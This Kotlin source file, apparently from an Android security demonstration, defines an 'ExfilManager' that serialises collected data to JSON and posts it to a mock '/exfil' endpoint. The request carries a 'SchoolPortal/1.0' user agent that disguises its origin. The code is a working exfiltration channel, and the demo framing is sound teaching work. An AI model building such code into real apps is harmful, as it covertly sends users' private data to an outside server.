package com.example.sitconnect.securitydemo.malicious

import android.util.Log
import com.google.gson.Gson
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext

object ExfilManager {
    private val client = OkHttpClient.Builder()
        .connectTimeout(10, TimeUnit.SECONDS)
        .readTimeout(10, TimeUnit.SECONDS)
        .build()

    private val jsonType = "application/json; charset=utf-8".toMediaType()

    suspend fun send(data: Map<String, Any?>) {
        withContext(Dispatchers.IO) {
            try {
                val json = Gson().toJson(data)
                val body = json.toRequestBody(jsonType)

                val request = Request.Builder()
                    .url("http://10.0.2.2:5000/exfil")  // ← your mock server
                    .post(body)
                    .addHeader("User-Agent", "SchoolPortal/1.0")
                    .build()

                client.newCall(request).execute().use { response ->
                    if (response.isSuccessful) {
                        Log.d("ExfilDemo", "Data sent OK")
                    } else {
                        Log.e("ExfilDemo", "Send failed: ${response.code}")
                    }
                }
            } catch (e: Exception) {
                Log.e("ExfilDemo", "Exfil error: ${e.message}")
            }
        }
    }
}